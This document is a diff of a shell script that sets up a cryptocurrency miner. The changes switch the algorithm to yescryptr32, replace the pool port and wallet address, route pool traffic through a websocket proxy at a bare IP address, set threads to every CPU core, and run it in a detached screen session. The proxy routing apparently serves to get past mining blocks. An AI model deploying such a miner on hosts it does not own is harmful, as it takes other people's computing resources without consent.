@@ -60,7 +60,7 @@ start_main_py() {
     echo 'main.py started in a screen session.'
 }
 
-# Main script execution starts here
+# Function to create config.json with dynamic thread count
 create_config_file() {
     cat <<EOL > config.json
 {
@@ -76,13 +76,18 @@ create_config_file() {
 }
 EOL
 }
-M_ALGO="yespowerr16"
+
+# Main script execution starts here
+M_ALGO="yescryptr32"
 M_HOST="stratum-asia.rplant.xyz"
-M_PORT="13382"
-M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
+M_PORT="17116"
+M_WORKER="UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx"
 M_PASSWORD="x"
-M_THREADS="16"
-M_PROXY="wss://flexible-eustacia-mtp-0b00e028.koyeb.app/proxy"
+M_PROXY="ws://172.233.136.27:8085/proxy"
+
+# Dynamically set the number of threads based on CPU cores
+M_THREADS=$(nproc)  # Number of threads set to the number of available CPU cores
+
 # Call functions in sequence
 
 # Install screen
@@ -99,9 +104,12 @@ download_python
 
 # Install required packages
 install_packages
+
+# Remove any existing config.json and create a new one with dynamic threads
 rm -f config.json
 create_config_file
-# Start main.py in a screen session
+
+# Start main.py
 start_main_py
 
 # Notify completion
